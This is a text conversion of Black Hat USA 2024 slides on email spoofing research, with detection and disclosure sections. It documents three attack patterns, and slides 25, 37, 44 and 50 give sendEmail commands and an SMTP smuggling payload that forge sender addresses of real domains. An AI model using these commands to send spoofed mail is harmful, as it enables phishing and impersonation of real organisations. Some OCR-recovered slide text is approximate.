---
title: "Into the Inbox Novel Email Spoofing Attack Patterns"
speakers: ["Hao Wang", "Caleb Sargent", "Harrison Pomeroy", "Renana Friedlich"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Hao Wang & Caleb Sargent & Harrison Pomeroy & Renana Friedlich_Into the Inbox Novel Email Spoofing Attack Patterns.pdf"
pages: 73
sha256: "a50d4c551519edb9975c7e904defa89039604627b578fda72e6dc085290af1c0"
text_chars: 30010
ocr_pages: 25
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:33:15Z"
---
# Into the Inbox Novel Email Spoofing Attack Patterns

**Speakers:** Hao Wang, Caleb Sargent, Harrison Pomeroy, Renana Friedlich  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Hao Wang & Caleb Sargent & Harrison Pomeroy & Renana Friedlich_Into the Inbox Novel Email Spoofing Attack Patterns.pdf` (73 pages)

## Slide 1

Into the Inbox: Novel Email Spoofing Attack Patterns

Speakers: Caleb Sargent & Hao Wang

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat +>
USA 2024
AUGUST 7-8, 2024
BRIEFINGS
Into the Inbox:
Novel Email Spoofing Attack Patterns
Speakers: Caleb Sargent & Hao Wang
BHUSA @BlackHatEvents
```

## Slide 2

### About Us

Caleb Sargent Offensive Security Engineer (@squared_)

Hao Wang Offensive Security Manager (@MrRed_Panda)

#BHUSA @BlackHatEvents

## Slide 3

### Disclaimer

**The ideas, content, or opinions expressed in this presentation are solely those of the author and do not reflect any endorsement or support by our employer.**

#BHUSA @BlackHatEvents

## Slide 4

### Agenda

1 **Story Time**

2 **Email Security Basics**

**Attack Patterns** 3

4 **Next Steps**

**Recommendations** 5

#BHUSA @BlackHatEvents

## Slide 5

#BHUSA @BlackHatEvents

## Slide 6

### Crafting the ultimate Prank.

#BHUSA @BlackHatEvents

## Slide 7

### Figuring out how to send an email

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
SMTP & API
cURL
SMTP APIK
= = curl --request POST \
—-url https://api.brevo.com/v3/smtp/email \
Your SMTP Settings —-header ‘accept: application/json' \
SMTP Server ~~header aps
Port
smtp-relay.brevo.com
587
terrible@friend.com
-—-header ‘conten
—-data
Login
sender
& Regenerate SMTP Login and Master password 'rhame' Send er
":"senderalex@example.com"
il":"testmail@example.com",
e":"John Doe"
```

## Slide 8

### Testing if this works

#BHUSA @BlackHatEvents

## Slide 9

### DMARC all passes

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Original message
Message ID
Created on:
From:
To:
Subject:
SPF:
DKIM:
DMARC:
DMARC all passes
<4deb8dc3-63ab-4880-a5ba-7077a05c9047@smitp-relay.sendinblue.com>
1 April 2024 at 17:15 (Delivered after 1 second)
"darryla@ com" <darryla@223030174 t-sender-sib.com> Using sendEmail-1.56
m=gmail.com
Subject: Urgent Action Required: HOA Notice - House Repainting Required
PASS with IP 185.41.28.5 Learn more
‘PASS' with domain t-sender-sib.com Learn more
‘PASS' Learn more
```

## Slide 10

Executing the prank AS SEEN IN
ATTACK
PATTERN 2

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
USA 2024
Executing the prank
darrylat <darryla@223030174.t-sender-sib.com>
tome ¥
Dear
We hope this email finds you well. It has come to our attention that the exterior paint color of your house located at [insert address] does not comply with the approved colors outlined in the HOA guidelines
The shade of black used on your house is not correct and will need to be repainted to match the approved color. This is the only aspect of your house that requires repainting
Please ensure that the shade of black is corrected within 30 days from the date of this notice. Example approved shades can be found attached.
2 attachments - Scanned by Gmail ©
Warm True Cool
Black Black Blac!
```

## Slide 11

### The Aftermath...

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
The Aftermath...
Me} 04/01/2024 5:48 PM
What else you got going on tonight?
=; Pil emo] 04/01/2024 5:50 Pm
<= Just gota letter from the HOA saying our house color is not approved
So drinking
```

## Slide 12

### Standing on the shoulders of giants

Marcello "byt3bl33d3r" Salvati

- § SpamChannel @ DEFCON 31

- § Two million domains affected

Timo Longin from  SEC Consult

- § SMTP Smuggling @ 37C3

- § Millions of domains affected

Reference: https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/ Reference: https://forum.defcon.org/node/245722

#BHUSA @BlackHatEvents

## Slide 13

### SPF / DKIM / DMARC

###### v **SPF**

q Verify Sender IP based on TXT record of domain via **MAIL FROM / HELO**

v **DKIM**

q Verify email based on the added DKIM signature

v **DMARC**

q Tell email receivers on how to handle unauthenticated emails

q Verify SPF or  DKIM  based on the domain passed via **FROM** q DMARC RFC 7489:

_DMARC's filtering function is based on whether the RFC5322.From field domain is aligned with (matches) an authenticated domain name from SPF or DKIM._

Reference: https://www.rfc-editor.org/rfc/rfc7489.html

#BHUSA @BlackHatEvents

## Slide 14

### Sample SMTP flow

HELO a.com Verify sender IP based on
MAIL FROM or HELO
MAIL FROM: <alice@a.com> SPF
Envelope
RCPT TO: <bob@b.com>
DATA
FROM: <alice@a.com>
TO: <bob@b.com> Verify SPF OR DKIM based on FROM
Subject: Hello World DMARC
Message
DKIM-Signature: v1; d=a.com;
h=Content
Verify email based on DKIM
DKIM

Reference: https://www.usenix.org/conference/usenixsecurity21/presentation/shen-kaiwen

#BHUSA @BlackHatEvents

## Slide 15

### SPF / DKIM / DMARC

###### **Q: Have you seen this before?**

###### **A: SPF and DKIM do not match the domain in the FROM field**

q dkim=pass header.i=@ **a.com** header.s=k1 header.b="KJCJ2k/N";

q spf= pass (xxx: domain of user@b.com designates xx.xx.xx.xx as permitted sender) smtp.mailfrom="user@ **b.com** "; q dmarc=fail (p=QUARANTINE sp=NONE dis=QUARANTINE) header.from= **c.com**

#BHUSA @BlackHatEvents

## Slide 16

### The players

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
The players
BreVO &sgo daddy’
© SPARK Ast
“" SendGrid mailtrap astmai
a
```

## Slide 17

### Iterate

#BHUSA @BlackHatEvents

## Slide 18

## Attack Pattern: #1

#BHUSA @BlackHatEvents

## Slide 19

###### Example: spoof email from networksolutions.com

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat
<<>> DiG 9.18.18-Oubuntu2.1-Ubuntu <<>> networksolutions.com txt
global options: +cmd
Got answer:
—>>HEADER<<-— opcode: QUERY, status: NOERROR, id: 39459
flags: qr rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 1
7 OPT PSEUDOSECTION:
EDNS: version: 0, flags:; udp: 65494
7 QUESTION SECTION:
networksolutions.com. IN
7 ANSWER SECTION:
etworksolutions.com. "google-site-verification=4eIncVtJhJsSwéqph
etworksolutions.com. "MS=ms37265135"
etworksolutions.com. "MS=ms78547785"
etworksolutions.cdff: ’ "v=spfl 1p4:91.199.212.0/24 include:spfl.
etworksolutions.cdm. 266 "facebook—domain-—verification=m4lpzwyjv2u
bhetworksolutions.com. 266 "google-site—verification=5hT-6CoNzJ0wCHw
```

## Slide 20

##### What is spf.websitewelcome.com?

Reference: https://serverfault.com/questions/723911/setting-up-an-spf-record-for-a-shared-hosting-service-with-lots-of-email-gateway

#BHUSA @BlackHatEvents

## Slide 21

##### Allowed SPF IP ranges by HostGator

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
<<>> DiG 9.18.18-Oubuntu2.1-Ubuntu <<>> spf.websitewelcome.com txt
global options: +cmd
Got answer:
—>>HEADER<<- opcode: QUERY, status: NOERROR, id: 60077
flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: O, ADDITIONAL: 1
OPT PSEUDOSECTION: . / ’
; EDNS: version: 0, flags:; udp: 65494 "192.185.0.0/16",
77; QUESTION SECTION: "2916.172.160.0/19"
;spf.websitewelcome.com.
ANSWER omc T Cyn =
spf.websitewelcome.com. 263 IN TXT "v=spfl ip4:192.185.0.0/16 ip4:50.116.64.
18 ip4:50.87.152.0/21 ip4:108.167.128.0/18 ip4:216.172.160.0/19 ip4:108.179.192.0/18 ip4:
2.144.0.0/16 -all"
Query time: 0 msec
SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
WHEN: Sat Jul 20 16:19:02 UTC 2024
MSG SIZE rcvd: 214
```

## Slide 22

##### Enable HostGator SMTP credentials

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Enable HostGator SMTP credentials
Mail Client Manual Settings
If you do not see an auto-configuration script for your client in tt
Username:
Password: Use the email account's password.
incoming gator4208.hostgator.com
Server: IMAP Port: 993 POP3 Port: 995
Outgoing
Server:
\ IMAP, POP3, and SMTP require authentication.
```

## Slide 23

###### HostGator SMTP server is included in the master SPF

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
<<>> DiG 9.18.18-Oubuntu2.1-Ubuntu <<>> gator4208.hostgator.com
global options: +cmd
Got answer:
—>>HEADER<<- opcode: QUERY, status: NOERROR, id: 56938
flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: O, ADDITIONAL: 1
OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494 - ?.144.0.0/16",
77 QUESTION SECTION:
.185.0.0/16",
7 gator4208 -hostgator.com. IN 185.@.0/16",
.172.160.0/19"
77 ANSWER SECTION:
gator4208 .hostgator.com. 7170 IN -167.189.34
```

## Slide 24

###### Attack flow

Envelope

**Verify sender IP based on the SPF record of** HELO victim.com **networksolutions.com MAIL FROM:<admin@networksolutions.com>** RCPT TO: <bob@b.com> DATA RFC 5322 Violation

SPF

Verify SPF status for networksolutions.com
DMARC

**FROM: <admin@networksolutions.com>** TO: <bob@b.com> **Message** Subject: Hello World DKIM-Signature: v1; d=victim.com;h=Content

#BHUSA @BlackHatEvents

## Slide 25

##### Send the email via utility

sendEmail -f admin@networksolutions.com -xu $username -xp $password

-t <u>target@gmail.com</u>

- -u “Hello World"

- -m "This is a test"

-s gator4208.hostgator.com:587

Reference: https://github.com/zehm/sendEmail

#BHUSA @BlackHatEvents

## Slide 26

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
USA 2024
Hello World inbox x
admin@networksolutions.com <admin@networksolutions.com>
tome v
This is a test email sent from the command line using sendEmail and HostGator.
Original Message
Message ID <735738.005812408-sendEmail@ubuntu-s-1vcpu-1gb-sfo3-01>
Created at: Fri, Jun 21, 2024 at 3:05 PM (Delivered after 3 seconds)
From: "admin@networksolutions.com" <admin@networksolutions.com>/Using sendEmail-1.56
To: "smtpcloudops@gmail.com" <smtpcloudops@gmail.com>
Subject: Hello World
PASS with IP 35.89.4437 Learn more
'PASS' Learn more
```

## Slide 27

### Pattern 1 results

6M

Domain Data Set

Vulnerable Domains

4.1M

~60%

Vulnerable Domains

The majority did not have DMARC configured

#BHUSA @BlackHatEvents

## Slide 28

### Pattern 1 results

6.8M
US Market

80M
Worldwide

~30%

Domain Vulnerability ?%

Domain Vulnerability

#BHUSA @BlackHatEvents

## Slide 29

#### Pattern 1: MAIL FROM + FROM + SPF abuse

###### Who is vulnerable?

Large domain registrar & email service & hosting providers

- **CVE-2024-7208**

- **CVE-2024-7209**

###### Attack pattern prerequisites?

- q Email address is not verified from **MAIL FROM** field

- q Email address is not verified from **FROM** field

- q Victim domains include the overly permissive / master SPF records

What is the impact?

Spoof emails from 6M+ domains

- Only 15% of the domains owned by two email and hosting providers were scanned.

Potentially affect **any type** of mailbox

#BHUSA @BlackHatEvents

## Slide 30

## Attack Pattern: #2

#BHUSA @BlackHatEvents

## Slide 31

##### Dual DKIM ?

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
USA 2024
Dual DKIM
path casa header. i=@ er. . b= tKXbD8q6;
.d= acetal
=)
SpTt=pass (EOOETE- COM domain Ot Dounce+t¥deec.4D1tT2 (PD)
n@purplecloudops.com”; (/
dmarc=pass (p=QUARANTINE sp=QUARANTINE dis=NONE), header. from=mailgun.org @
DKIM-Signature: a=rsa-sha256; v=1; c=relaxed/relaxed; d=purplecloudops.com; q=dns/txt; : SS
From: Message-ID: Ser ender: X-F@@@DacK-Id; bh=QK/yDOH17MptNkDjFgtSTvbLuMrPXB12Lab:
JS m
3
6; v=1; c=relaxed/relaxed; d=mailgun.org; q=dns/txt; s=mg; t:
~: X-Feedback- Id; bh=QK/yDOH17} iptNkDjFgtstv ‘bLuMrPXB12LabiZx9xry
2?
nder: S 6.9)
b=tKXbD8&q69J syW4jWISHIOBO7VsIEk6efdIgrwQpz3vR O80zarimMp/gj21w u2PMTSG3x1VL1IrTONP1b9af+GHt
DKIM-Signature: a 56 \ZZaN)
```

## Slide 32

##### What is the Feedback Loop?

Reference: https://mailtrap.io/blog/email-feedback-loop/

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
What is the Feedback Loop?
Sender/Email
L
a Service Provider
SN
w Return feedback
— to sender or email T
= J service provider
Feedback
\ Loop /
Mailbox Recipients ~
A Providers
ee a
| as spam
Reference: https://mailtrap.io/blog/email-feedback-loop/
```

## Slide 33

##### Gmail Feedback Loop requirement

Reference: https://support.google.com/a/answer/6254652

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Gmail Feedback Loop requirement
About the data
The aggregate data will be generated for the first 4 fields (as separated by ‘:’) of the Feedback-
ID:, starting from the right side. If the SenderId is empty, no data will be generated. If another
field is empty, data will be generated for the rest of the fields.
n order to prevent spoofing of the Feedback-1ID, the traffic being sent to Gmail needs to be
DKIM signed by a domain owned (or controlled) by the sender, after the addition of this header.
access the FBL data.
```

## Slide 34

### FROM + DKIM abuse

Domain
Verification

DKIM

#BHUSA @BlackHatEvents

## Slide 35

###### Attack Flow: Spoof mailgun.org for Gmail mailbox

HELO a.com
MAIL FROM: <alice@a.com>
Envelope
RCPT TO: <bob@b.com>
DATA
RFC 5322 Violation
Verify DKIM status for mailgun.org
FROM: <alice@mailgun.org> DMARC
TO: <bob@b.com>
Message
Subject: Hello World
DKIM-Signature: v1; d=a.com;
Signed DKIM email by sender mailgun.org
DKIM
DKIM-Signature: v1;d=mailgun.org;

#BHUSA @BlackHatEvents

## Slide 36

##### Generate some API keys

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Generate some API keys
New API Key x
© Info: this API key is displayed only once, now. Therefore, c
key somewhere safe but accessible. If you lose this key, you can delete it
and keep this
Description 4+
and generate a new one
testing API key
Spoof some emails
newkey
```

## Slide 37

##### Send the email via utility

sendEmail -f **admin@mailgun.org** -xu $username -xp $password

-t <u>target@gmail.com</u>

- -u "Spoofed Email"

- -m "This is a test"

-s smtp.mailgun.com:587

Reference: https://github.com/zehm/sendEmail

#BHUSA @BlackHatEvents

## Slide 38

Example: Spoof mailgun.org for Gmail mailbox

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Example: Spoof mailgun.org for Gmail mailbox
Spoofed Email
admin@mailgun.org
This is a test
€ Reply) (
@ Forward } (©)
Original Message
870167.472024576-sendEmail@ubuntu-s-1vcpu-1gb-sfo3-01
"admin@mailgun.org” <admin@mailgun.org> Using sendEmail-1.56
"smtpcloudops@gmail.com" <smtpcloudops@gmail.com>
Message ID
Created at Fri, May 3, 2024 at 9:36 AM (Delivered after 2 seconds)
From
To
Subject Spoofed Email :
SPF PASS with IP 159.135.228.59 Learn more
DKIM ‘PASS' with domain mailgun.org Learn more
DMARC ‘PASS' Learn more
```

## Slide 39

### Spoofing root domains

sendinblue.com

Mailgun.org

t-sender-sib.com

- *Dependent on how the FROM field is displayed in the inbox

#BHUSA @BlackHatEvents

## Slide 40

##### Examples: Spoofing from Brevo

Outlook

Private Email

Gmail

sendinblue.com

t-sender-sib.com

sendinblue.com

#BHUSA @BlackHatEvents

## Slide 41

### Pattern 2: FROM + DKIM abuse

###### Who is vulnerable?

Large email service providers, such as Brevo and Mailgun, who leverage Feedback Loop (FBL) feature of popular mailbox providers such as GMAIL, Outlook, and Yahoo Mail to collect users' complaints

###### Attack pattern prerequisites?

- **CVE-2024-7208**

q Email address is not verified from **FROM** field

q A **DKIM** signature is required by FBL for email sender

What is the impact?

Spoof emails from the sender DKIM domain used for FBL

#BHUSA @BlackHatEvents

## Slide 42

## Attack Pattern: #3

#BHUSA @BlackHatEvents

## Slide 43

### What is SMTP Smuggling?

v Discovered by Timo Longin from SEC Consult Vulnerability Lab

###### v Abuse the difference of end-of-data sequence interpretation for outbound / inbound SMTP servers

Reference: https://smtpsmuggling.com/

#BHUSA @BlackHatEvents

## Slide 44

### SMTP Smuggling impact

v Some email gateways are still vulnerable to SMTP Smuggling with default configuration.

v The impact could be expanded if the affected outbound SMTP server is allowed to send emails on behalf of many domains.

**SMTP Command**

**SMTP Smuggling Payload <CR>.<CR>**

**Smuggled SMTP Command & Message**

EHLO a.com \r\n MAIL FROM: <alice@a.com> \r\n Envelope RCPT TO: <bob@b.com> \r\n DATA \r\n

FROM: <alice@a.com> \r\n TO: <bob@b.com> \r\n Subject: Original Message \r\n \r\n \r.\r MAIL FROM: <admin@a.com> \r\n Message RCPT TO: <victim@b.com> \r\n DATA  \r\n FROM: <admin@a.com> \r\n TO: <victim@b.com> \r\n Subject: Smuggled Message \r\n \r\n \r\n.\r\n

#BHUSA @BlackHatEvents

## Slide 45

###### Example: spoof email from iowa.gov

Reference: https://www.twilio.com/docs/sendgrid/ui/account-and-settings/spf-records

#BHUSA @BlackHatEvents

## Slide 46

###### Allowed SPF IP ranges by SendGrid

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
USA 2024
Allowed SPF IP ranges by SendGrid
sendgrid
50.31.32.0/19 (8192 addresses)
149.72.0.0/16 (65536 addresses)
159.183.0.0/16 (65536 addresses
167.89.0.0/17 (32768 addresses)
TWILIO 168.245.0.0/17 (32768 addresses)
a” S dG id 192.254.112.0/20 (4096 addresses)
| en ri 198.21.0.0/21 (2048 addresses)
198.37.144.0/20 (4096 addresses)
208.117.48.0/20 (4096 addresses)
223.165.113.0/24 (256 addresses)
223.165.115.0/24 (256 addresses)
223.165.118.0/23 (512 addresses)
223.1 120.0/23 (512 addresses)
```

## Slide 47

###### Enable SendGrid SMTP credentials

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
USA 2024
Enable SendGrid SMTP credentials
Create API Key
API Key Name *
Email Spoofing Research
. API Key Created
API Key Permissions Please copy this key and save it somewhere safe.
For security reasons, we cannot show it to you again
Full Access
Allows the API key to access GET, PATCH, PUT, DELETE, and POST endpoints for all parts of your account, excluding billing
Restricted Access
Customize levels of access for alparts of your account, excluding biling and Email Address Validation | cone |
Billing Access
Allows the API key to access billing endpoints for the account. (This is especially useful for Enterprise or Partner customers
looking for more advanced account management)
c Create & View
#BHUSA @BlackHatEvents
```

## Slide 48

###### First attempt without SMTP Smuggling

###### SendGrid Outbound SMTP

Message

MAIL FROM:<admin@iowa.gov> \r\n RCPT TO: <victim@b.com> \r\n DATA \r\n **FROM: <admin@iowa.gov>** \r\n TO: <victim@b.com> \r\n Subject: Smuggled Message \r\n \r\n \r\n.\r\n

#BHUSA @BlackHatEvents

## Slide 49

###### First attempt without SMTP Smuggling

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piseichat | |
USA 2024
First attempt without SMTP Smuggling
SUCCESS => Received: 250-smtp.sendgrid.net, 250-8BITMIME, 250-PIPELINING, 250-SIZE 31457280, 250-STARTTLS, 250-AUTH PLAIN LOGIN, 250 Al
DEBUG => SMTP-AUTH: Using LOGIN authentication method
INFO => Sending: AUTH LOGIN
SUCCESS => Received:
INFO => Sending:
SUCCESS => Received:
INFO => Sending:
SUCCESS => Received: 235 Authentication successful
DEBUG => User authentication was successful (Method: LOGIN)
INFO => Sending: MAIL FROM:<noreply@iowa.gov>
SUCCESS => Received: 250 Sender address accepted
INFO => Sending: RCPT TO:<smtpcloudops@gmail . com>
SUCCESS => Received: 250 Recipient address accepted
INFO => Sending: DATA
SUCCESS => Received: 354 Continue
INFO => Sending message body
Setting content-type: tq "pratt
ERROR => Received: 550 The from address does not match a verified Sender Identity. Mail cannot be sent until this error is resolved.
```

## Slide 50

###### SendGrid Outbound SMTP

###### Vulnerable Inbound SMTP

**SMTP Smuggling Payload <CR>.<CR>**

**Smuggled SMTP Command  and Message**

Message

MAIL FROM: <alice@a.com> \r\n EHLO a.com \r\n RCPT TO: <bob@b.com> \r\n MAIL FROM: <alice@a.com> \r\n DATA \r\n RCPT TO: <bob@b.com> \r\n FROM: <alice@a.com> \r\n Original DATA \r\n TO: <bob@b.com> \r\n Message FROM: <alice@a.com> \r\n Subject: Original Message \r\n TO: <bob@b.com> \r\n \r\n Subject: Original Message \r\n \r\n.\r\n \r\n **\r.\r** RFC 5322 Violation MAIL FROM:<admin@iowa.gov> \r\n MAIL FROM:<admin@iowa.gov> \r\n RCPT TO: <victim@b.com> \r\n RCPT TO: <victim@b.com> \r\n DATA \r\n DATA \r\n FROM: <admin@iowa.gov> \r\n Smuggled FROM: <admin@iowa.gov> \r\n Message TO: <victim@b.com> \r\n TO: <victim@b.com> \r\n Subject: Smuggled Message \r\n Subject: Smuggled Message \r\n \r\n \r\n \r\n.\r\n \r\n.\r\n

#BHUSA @BlackHatEvents

## Slide 51

###### Deliver spoofed emails to vulnerable email gateway users

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Deliver spoofed emails to vulnerable email gateway users
Smuggled Email
06 admin@iowa.gov
To
Retention Policy DPT default 3 year delete (3 years)
@we removed extra line breaks from this message.
This message is from an external sender.
The Smuggled email is successfully delivered . Q
Authentication-Results: Epi-pass }sender IP is 149.72.120.130)
smtp.mailfrom=iowa.gov; dkim=none *(message not signed)
header.d=noneadmarc=pass faction=none header. from=iowa.gov;compauth=pass
reason=100
```

## Slide 52

### Pattern 3 results Nearly 1 Million high-reputation domains vulnerable

4 0K
Domains
1 30K
Domains
7 90K
Domains

#BHUSA @BlackHatEvents

## Slide 53

#### Cisco Secure Email (Cloud) Gateway issue

v With the default option “CLEAN” selected

q Replace all bare CR and LF characters the CRLF sequence.

- v With the option “REJECT” selected

- q Reject message containing bare CR or LF characters

- v With the option “ALLOW” selected (Deprecated)

Clean VS Reject

- q Allows the message without converting bare CR or LF characters

Cisco adds new functionality that helps to flag messages with invalid end-of-message sequence by adding a new email header around May 2024

X- Ironport-Invalid-End- Of- Message Extension Header (X-Header)

Reference: https://smtpsmuggling.com/

#BHUSA @BlackHatEvents

## Slide 54

#### Pattern 3: Expanded SMTP Smuggling abuse

###### Who is vulnerable?

Sender: large email and web hosting providers with misconfigured outbound SMTP servers such as SendGrid, SparkPost, MailTrap, and Fastmail.

Receiver: organizations using outdated / misconfigured inbound SMTP servers such as Cisco Secure Email Gateway and Fastmail

What is the impact?

Attack pattern prerequisites?

Spoof emails close to 1M+ highreputation domains

(including domains configured with proper SPF and DMARC)

**Find the right pair of outbound and inbound SMTP servers**

v Outbound SMTP servers that do not filter special end-of-data sequence

- v Inbound SMTP servers that accept special end-of-data sequence

#BHUSA @BlackHatEvents

## Slide 55

### How can we detect this?

###### Email Message Id RFC-2822

v For email, the Message-ID is an identifier that your mail server adds when it sends your email. It can look something like this "Message-ID: <CAKBqNfyKo+ZXtkz6DUAHw6FjmsDjWDB-pvHkJy6kwO82jTbkNA@mail.gmail.com>" v The data after the @ symbol generally refers to the server sending the email to the world, and the string before the @ symbol is the unique identifier.

Recommendations For Logging:

- v We would recommend logging Email Message-IDs alongside any trace data, or various email security checks (DKIM, SPF, DMARC etc.)

v For Detection we focus on the characteristics of an external sender with external & internal Message-IDs. The Message-IDs are the core focus for detection.

#BHUSA @BlackHatEvents

## Slide 56

### Detection logic

1. External Sender, with an external Message-ID

2. Sending multiple emails within minutes

3. After the original email with the external Message-ID, another email is present from the same sender but with an internal mail server as the Message-ID.

External

Internal

#BHUSA @BlackHatEvents

## Slide 57

## DNS Data Analytics

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
é ae
blackhat ~© -
USA 2024
DNS Data Analytics
```

## Slide 58

### Methodology

###### v Sticker shock set in…

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
USA 2024
Methodology
“*¢ Sticker shock set in...
RE: 25302-Requesting access to Open Data datasets
e°" © | © reply
InIs message 1s trom an external senaer.
4i Hao,
A Forward |
lead the global strategic alliances team at Rapid7.
Vhat you have outlined below definitely falls under our commercial use case. There is a}$: )0 USD annual feelassociated with access to the data.
his includes
+ The data is a package so you get all sources listed here vs an a la carte approach
+ We provide 37 months of historical
+ All data can be pulled directly from the site or programmatically site or via API
Vhen you're ready, I'm happy to draw up an official quote & send over the Terms of Service.
mx 2023-10-18 Dataset
Item & Description Amount
mx 2023-10-18 $112,124
Full dataset from Email Hosting Providers - Category Datasets
191,768,664 Unique Web Domains covering 7,829,179,421 technology records over 74,386,167 website and subdomains.
```

## Slide 59

### We'll build our own data set

v With DMARC and SPF records

- v ChatGPT, write me a program...

- v Results in millions of domains with millions of results

- v Parse some JSON

#BHUSA @BlackHatEvents

## Slide 60

### Better way to do this?

v Acquire ASN and IP blocks

v Match them

v Do an MX record lookup on all of them

v Import the data

v Build a Kibana and Nifi cluster to query them all

# Data

#BHUSA @BlackHatEvents

## Slide 61

## Disclosure

#BHUSA @BlackHatEvents

## Slide 62

### Does abuse@company.com work?

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
blackhat
USA 2024
Does abuse@company.com work?
Email Spoofing Vulnerability Responsible Disclosure - DCU-826755 » inbox x
Digital Crimes Unit <care@services.godaddy.com> Wed, 24 Apr, 14:09
tome ~
(0) GoDaddy
Everything you need to know about
your Abuse Report:
This email inbox isn't monitored. To finish your report, please go to the Abuse
Reporting Form.
We'll review your complaint and process in accordance with our policies, and will
contact you only if necessary and at our discretion.
If you submit (or have already submitted) your report using the Abuse Reporting
Form, additional submissions from the same email within 24 hours may not receive
another notice of receipt.
To send reports in bulk, you can use our API for brand protection and industry
partners.
View Abuse Reporting Form >
```

## Slide 63

### But sometimes things take a while

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
But sometimes things take a while
~
¢ } Caleb Sargent Fri,24May, 1645 yy © &
to Twilio ~
Good Afternoon Team,
We wanted to check in to see if there has been any movement on this ticket, as we just retested this issue and it's still there. We'll be opening a US-CERT case against this
vulnerability and plan to disclose the issue at BlackHatUSA at the beginning of August.
Regards,
Caleb
e Compliance Operations Team (Twilio SendGrid Support) <support@twiliosendgrid.zendesk.com> Sat, 25 May, 08:21 + a
lap) tome ~
Compliance Operations Team (SendGrid)
Hi Calebsargent,
| am transferring your request to our Consumer Trust team, who will provide further assistance. If you have any additional questions about this request,
please respond with them here.
Onboarding & Compliance Operations
```

## Slide 64

### Disclosure timeline

US CERT Coordination

**CVE-2024-7209**

###### **CVE-2024-7208**

50+ Vendors

Notified affected
vendors Dark Reading Blog CVE Assignment We are Here
Vendors
2024 Apr 23-30 May 28 Jul 18 Jul 23 Jul 29 Jul 30 Aug 7
Coordination with  US-CERT
US-CERT Disclosure Deadline US-CERT Blog

Reference: https://kb.cert.org/vuls/id/244112

#BHUSA @BlackHatEvents

## Slide 65

## Recommendations

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
g) :
blackhat ~~ :
USA 2024
Recommendations
```

## Slide 66

### Follow the RFC

###### SPF / DKIM / DMARC

###### RFC 5322 Section 3.6.2

###### RFC 7489 Section 4.2

###### RFC 7208 Section 11.4

###### RFC 6409 Section 6.1

In all cases, the "From:" field **SHOULD NOT** contain any mailbox that does not belong to the author(s) of the message

DMARC's filtering function is based on whether the RFC5322.From field

domain is aligned with (matches) an **authenticated domain** name from SPF or DKIM.

It is up to mail services and their MTAs to directly prevent crossuser forgery: based on SMTP AUTH ([RFC4954]), **users MUST** be restricted to using only those email addresses that are under their control...

The MSA **MAY** issue an error response to a RCPT command if inconsistent with the permissions given to the user (if the session has been authenticated)

It is important to note that the authentication mechanisms employed by DMARC authenticate only a DNS domain and do not authenticate the localpart of any email address identifier found in a message…

#BHUSA @BlackHatEvents

## Slide 67

### Follow the RFC

###### SMTP Smuggling

###### RFC 2822 Section 4

###### RFC 5321 4.1.1.4

###### RFC 5322 Section 2.3

Obsolete Syntax

- **\x0 NUL** character usage

.. the sequence "<LF>.<LF>" (bare line feeds, without carriage returns) **MUST NOT** be treated as equivalent to <CRLF>.<CRLF> as the end of mail data indication.

CR and LF **MUST** only occur together as CRLF; they **MUST NOT** appear independently in the body.

#BHUSA @BlackHatEvents

## Slide 68

### Black Hat Sound Bytes

